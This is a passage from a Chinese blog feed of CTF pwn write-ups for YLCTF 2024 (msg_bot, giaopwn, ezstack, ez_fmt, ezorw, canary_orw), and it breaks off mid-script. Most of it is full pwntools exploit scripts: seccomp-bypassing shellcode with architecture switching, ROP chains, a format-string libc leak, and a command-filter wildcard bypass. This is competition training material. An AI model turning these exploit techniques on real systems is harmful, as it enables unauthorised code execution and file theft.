src="https://c-lby.top/images/2024YLCTF-1/%E6%89%A7%E8%A1%8C%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%97%B6%E6%9F%A5%E7%9C%8B%E5%81%8F%E7%A7%BB.png" alt="执行加载器时查看偏移"></p><p>此时rsi是0x*54，但是执行完syscall之后，rip会在0x*84（syscall占两个字节），能算出他们之间的偏移是0x30。所以传入下一段shellcode的时候要在payload前面加上一段0x30的padding。</p><h5 id="retfq"><a href="#retfq" class="headerlink" title="retfq"></a>retfq</h5><p>上面提到我们需要转架构成32位后执行open函数，具体来说我们需要借助<code>retf</code>这个汇编指令。网上有详细的介绍，但是我也是第一次遇到实际题目，所以还是写一下。<code>retf</code>这个指令等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br></pre></td></tr></table></figure><p>ip寄存器都很熟悉了，存放的时候retf结束后开始执行代码的地址。但是x86架构下的cs寄存器和8086里的用处已经不一样了。x86开始，cpu支持访问4G内存，CS寄存器作为代码段寄存器的意义已经不大了，在8086完成了它的使命之后，它被赋予了新的功能。对于retf这个指令来说，他可以控制我们需要切换的架构。cs为0x23的时候执行retf可以进入到32位模式，此时寄存器只有低32位可以使用，栈地址等也只能访问到32位地址。这也就是为什么我们需要一段32位地址的可执行内存来存放shellcode。cs为0x33的时候可以回到64位模式。</p><p>顺带一提，在8086中retf指令只是拿来转移cs段用的指令而已。</p><p>我们的间接可控地址现在在rsi寄存器里，别忘了这时候还是指向0x*54。所以我们需要将rsi加上一个值，让程序可以执行到后面的shellcode。这里我选择加0x3f，同时我在写payload的时候也会在这一段shellcode后面加上一些nop，这样就算我rsi跳到很后面了，我的代码也不会因执行不了而报错。因此，转架构可以写这样的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sc_to86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop /*可去除*/</span></span><br><span class="line"><span class="string">add rsi, 0x3f</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">sc += asm(sc_to86, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里用的不是retf而是retfq，其中q只是限定了字大小而已，64位下采用retfq，32位下还是用retf。顺带一提，加上的那个0x3f并不能乱取，其中的0x30是为了跳过前面那些padding，剩下的0xf至少要保证能够跳过sc_to86这一段code。也就是说这个0xf可以更大，但是不能小到这段code都跳不过。ljust中的0x40要保证大于等于code中的0x3f。然后接下来就是写一段32位的open调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sc_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add esi,0x1b0</span></span><br><span class="line"><span class="string">mov esp, esi</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc += asm(sc_open, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br></pre></td></tr></table></figure><p>open在32位下的系统调用号是5。这里给esi又加上了一些偏移赋给了esp，这里是给系统调用开辟栈空间，一样是使用mmap的内存，一存多用。注意32的传参寄存器和64位不一样。</p><h4 id="写一段64位的rw系统调用"><a href="#写一段64位的rw系统调用" class="headerlink" title="写一段64位的rw系统调用"></a>写一段64位的rw系统调用</h4><p>首先需要先转换回64位，因为沙盒只开放了64位的read和write供我们使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sc_to64 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub esi, 0x1b0</span></span><br><span class="line"><span class="string">add esi, 0x28</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push esi</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc += asm(sc_to64, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里把之前当栈地址使用的esi寄存器还原，并加上一点偏移给到IP寄存器。这里同理，这里的0x28至少要保证跳过sc_open+sc_to64两段code。然后加一些nop来作为padding。下面就正常写rw的shellcode即可，这里我们需要一个地方来存放我们的flag，只要将rsi寄存器加上一点偏移就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sc_rw = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add rsi, 0x50</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc += asm(sc_rw, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后把sc发上去就能顺利打印出flag了。到此为止，这道题就结束了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bot_pb2 <span class="keyword">as</span> pb</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># e = ELF(&#x27;./msg_bot&#x27;)</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">push 0x96</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc_to86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">add rsi, 0x3f</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sc_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add esi,0x1b0</span></span><br><span class="line"><span class="string">mov esp, esi</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sc_to64 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub esi, 0x1b0</span></span><br><span class="line"><span class="string">add esi, 0x28</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push esi</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sc_rw = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add rsi, 0x50</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(sc1, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sc = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">sc += asm(sc_to86, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">sc += asm(sc_open, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sc += asm(sc_to64, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">sc += asm(sc_rw, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./msg_bot&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;challenge.yuanloo.com&quot;, 41741)</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;botmsg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">msg = pb.msgbot()</span><br><span class="line">msg.msgid = <span class="number">0xC0DEFEED</span></span><br><span class="line">msg.msgsize = <span class="number">0xF00DFACE</span></span><br><span class="line">msg.msgcontent = AE64().encode(shellcode, strategy=<span class="string">&#x27;small&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(msg.SerializeToString()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">r.send(msg.SerializeToString())</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(sc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>WP看着短，实际因为本人平时shellcode练习太少，这道题花了差不多一天才浑浑噩噩地做出来。我也不知道哪里来的毅力和意志，能为了一道题花了几乎一整个白天肝了出来。从一开始毫无思路、工具调不对、思路错误、因为没有mmap调用而红温、数据包长度不对、shellcode执行报错、这样那样的各种问题，到能坚持到打通拿到flag，真是觉得不可思议（而且此时其他题并还没有ak，只是看到了protobuf就来做做了）。不过确实算是一个很宝贵的经验，学到了很多之前没接触过的shellcode思路和绕过方法，也告诉了我自己的薄弱点在哪里。一开始不理解为什么前9个大佬为什么能这么快就做出来，做出来才发现其实不难，重要的是经验，真到大型赛事的时候，不可能有这么多时间给我来像这样一点点推演的。</p><p>还得练</p>]]></content>
    
    
    <summary type="html">做了一天，我太菜了</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
    <category term="protobuf" scheme="https://c-lby.top/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>『YLCTF 源鲁杯 2024』 PWN-1 WP</title>
    <link href="https://c-lby.top/2024/10/12/2024YLCTF-1/"/>
    <id>https://c-lby.top/2024/10/12/2024YLCTF-1/</id>
    <published>2024-10-12T08:14:56.000Z</published>
    <updated>2024-10-23T15:26:31.046Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-giaopwn"><a href="#0x00-giaopwn" class="headerlink" title="0x00 giaopwn"></a>0x00 giaopwn</h2><p>ret2text，没什么好讲的。有个cat flag的字符串，直接用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">41537</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400743</span></span><br><span class="line">flag = <span class="number">0x601048</span></span><br><span class="line">system = <span class="number">0x4006D2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(flag)+p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x01-ezstack"><a href="#0x01-ezstack" class="headerlink" title="0x01 ezstack"></a>0x01 ezstack</h2><p>栈溢出+rce字符过滤。这道题的做法挺多的。过滤了c、f、s、h，且只能写十个字节。Linux万物皆文件，是文件就能用通配符进行模糊匹配。比如flag可以写成*lag。那cat咋办呢，cat命令本身指向&#x2F;bin&#x2F;cat这个文件，那么一样可以用&#x2F;bin&#x2F;*at来匹配。cat是个命令，所以直接*at是不行的。</p><p>还要注意一下栈平衡的问题。另外就是这里只能写十个字节，写完<code>/bin/\*at </code>就只剩一个位置写*了，所以会把当前目录下所有东西都打印出来，flag也包括在里面，得找一找。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="number">48489</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ezstack&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ezstack&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">vuln = <span class="number">0x401275</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(ret)+p64(vuln)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your command\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;/bin/?at *&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>另外我的学弟Garhin师傅利用<code>$0</code>直接getshell了，tql。然后想到<code>/bin/ba??</code>这样的形式应该也是能getshell的，所以这道题解法应该有很多。</p><h2 id="0x02-ez-fmt"><a href="#0x02-ez-fmt" class="headerlink" title="0x02  ez_fmt"></a>0x02  ez_fmt</h2><p>栈上fmt+栈溢出。泄露libc之后直接溢出到ogg就行了，不用劫持got表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">21821</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./pwn&quot;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011DD</span></span><br><span class="line">vuln = <span class="number">0x40120D</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;YLCTF\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;%13$p&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln))</span><br><span class="line">libc_base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ogg = libc_base+<span class="number">0xe3b01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;YLCTF\n&#x27;)</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;\x00&#x27;</span>+p64(ogg))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-ezorw"><a href="#0x03-ezorw" class="headerlink" title="0x03 ezorw"></a>0x03 ezorw</h2><p>沙箱shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000013  if (A == readv) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000014  if (A == writev) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000142  if (A == execveat) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000024f  if (A == 0x24f) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>禁用了普通的orw，那就用openat+sendfile的方案。零拷贝是真的好用，要是不强制使用read和write，现在基本都用sendfile。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">34957</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./ezorw&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, 3</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x100</span></span><br><span class="line"><span class="string">    push SYS_sendfile</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(sc)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;orw~&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x04-canary-orw"><a href="#0x04-canary-orw" class="headerlink" title="0x04 canary_orw"></a>0x04 canary_orw</h2><p>gadget+shellcode。不知道我是不是把题目非预期了，给了个vuln函数是一点没用上。程序一来就直接可以往main的返回地址写东西，允许写最大21个字节。给了个canary形同虚设，NX也没开，所以直接往栈上写shellcode就完事了。</p><p>先利用jmp rsp执行一个read函数，因为字节数不够写，所以先不改rdx，还是写21字节，然后把一个可以读取更多字节数的read的shellcode写进去，再把orw的shellcode写进去就行。注意rsp会往下推，每次shellcode前面都要加上一定的padding就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./canary&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="number">38925</span>)</span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x400820</span></span><br><span class="line">jmp_rsp = <span class="number">0x40081B</span></span><br><span class="line"></span><br><span class="line">payload = p64(jmp_rsp) + \</span><br><span class="line">    asm(<span class="string">&quot;xor eax, eax; mov rsi,rsp; mov edi,0; syscall&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+asm(<span class="string">&quot;xor eax,eax;mov edx,0x100;syscall&quot;</span>))</span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    push SYS_open</span></span><br><span class="line"><span class="string">    